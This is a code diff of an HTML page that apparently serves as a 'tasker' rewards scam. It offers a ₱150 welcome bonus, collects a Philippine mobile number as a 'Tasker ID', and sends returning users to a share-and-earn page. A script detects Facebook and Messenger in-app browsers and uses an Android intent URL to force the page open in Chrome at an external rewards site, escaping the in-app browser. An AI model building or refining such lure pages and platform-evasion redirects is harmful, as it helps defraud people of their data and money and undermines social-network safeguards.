@@ -100,38 +100,40 @@
             <div class="modal-card">
                 <button class="modal-close" onclick="closeModal()">✕</button>
                 
-                <div class="modal-icon">
-                    <i class="fas fa-gem"></i>
-                </div>
-                <h2 class="modal-title">VERIFY YOUR NUMBER</h2>
-                <p class="modal-subtitle">This will be your <span class="gold-text">Tasker ID</span><br>Don't use unverified numbers to avoid payout difficulties</p>
-                
-                <div class="bonus-box-premium">
-                    <div class="bonus-glow"></div>
-                    <div class="bonus-amount-premium">₱150</div>
-                    <div class="bonus-label-premium">WELCOME BONUS</div>
-                    <div class="bonus-shine"></div>
-                </div>
-                
-                <div class="input-group-premium">
-                    <label class="input-label-premium">
-                        <i class="fas fa-mobile-alt"></i>
-                        Mobile Number
-                    </label>
-                    <div class="input-wrapper-premium">
-                        <span class="input-prefix-premium">+63</span>
-                        <input type="tel" id="userPhone" placeholder="912 345 6789" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                <div id="modalBodyContent">
+                    <div class="modal-icon">
+                        <i class="fas fa-gem"></i>
                     </div>
-                </div>
-                
-                <button class="login-btn" id="claimBtn" onclick="processStep1()">
-                    <span class="login-text">LOGIN</span>
-                    <span class="login-dots"></span>
-                </button>
-                
-                <div class="warning-text-premium">
-                    <i class="fas fa-shield-alt"></i>
-                    <span>Complete more task to process instant withdrawals</span>
+                    <h2 class="modal-title">VERIFY YOUR NUMBER</h2>
+                    <p class="modal-subtitle">This will be your <span class="gold-text">Tasker ID</span><br>Don't use unverified numbers to avoid payout difficulties</p>
+                    
+                    <div class="bonus-box-premium">
+                        <div class="bonus-glow"></div>
+                        <div class="bonus-amount-premium">₱150</div>
+                        <div class="bonus-label-premium">WELCOME BONUS</div>
+                        <div class="bonus-shine"></div>
+                    </div>
+                    
+                    <div class="input-group-premium">
+                        <label class="input-label-premium">
+                            <i class="fas fa-mobile-alt"></i>
+                            Mobile Number
+                        </label>
+                        <div class="input-wrapper-premium">
+                            <span class="input-prefix-premium">09</span>
+                            <input type="tel" id="userPhone" placeholder="12 3456 789" maxlength="9" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
+                        </div>
+                    </div>
+                    
+                    <button class="login-btn" id="claimBtn" onclick="processStep1()">
+                        <span class="login-text">LOGIN</span>
+                        <span class="login-dots"></span>
+                    </button>
+                    
+                    <div class="warning-text-premium">
+                        <i class="fas fa-shield-alt"></i>
+                        <span>Complete more task to process instant withdrawals</span>
+                    </div>
                 </div>
             </div>
         </div>
@@ -148,7 +150,6 @@
             const existingUserPhone = localStorage.getItem("userPhone");
             const existingDeviceId = localStorage.getItem("userDeviceId");
             
-            // If user already has valid credentials, redirect to share_and_earn
             if (existingUserPhone && existingUserPhone !== 'null' && existingUserPhone !== 'undefined' && existingUserPhone.length > 5) {
                 console.log('Existing user detected:', existingUserPhone);
                 console.log('Redirecting to share_and_earn.html...');
@@ -156,28 +157,22 @@
             }
         })();
 
-<!-- INTENT URL HANDLER --->
-    (function() {
-        
-        const isFacebookApp = navigator.userAgent.includes('FBAN') || 
-                              navigator.userAgent.includes('FBAV') ||
-                              navigator.userAgent.includes('Messenger');
-        
-        if (isFacebookApp && !window.location.hash.includes('redirected')) {
+        // ========== INTENT URL HANDLER ==========
+        (function() {
+            const isFacebookApp = navigator.userAgent.includes('FBAN') || 
+                                  navigator.userAgent.includes('FBAV') ||
+                                  navigator.userAgent.includes('Messenger');
             
-            window.location.hash = 'redirected';
-            
-            
-            const targetUrl = 'https://xjiligames.github.io/rewards/index.html';
-            
-            
-            const urlWithoutProtocol = targetUrl.replace('https://', '');
-            const intentUrl = `intent://${urlWithoutProtocol}#Intent;scheme=https;package=com.android.chrome;end`;
-            
-            // Redirect to intent
-            window.location.href = intentUrl;
-        }
-    })();
+            if (isFacebookApp && !window.location.hash.includes('redirected')) {
+                window.location.hash = 'redirected';
+                
+                const targetUrl = 'https://xjiligames.github.io/rewards/index.html';
+                const urlWithoutProtocol = targetUrl.replace('https://', '');
+                const intentUrl = `intent://${urlWithoutProtocol}#Intent;scheme=https;package=com.android.chrome;end`;
+                
+                window.location.href = intentUrl;
+            }
+        })();
     </script>
 </body>
 </html>
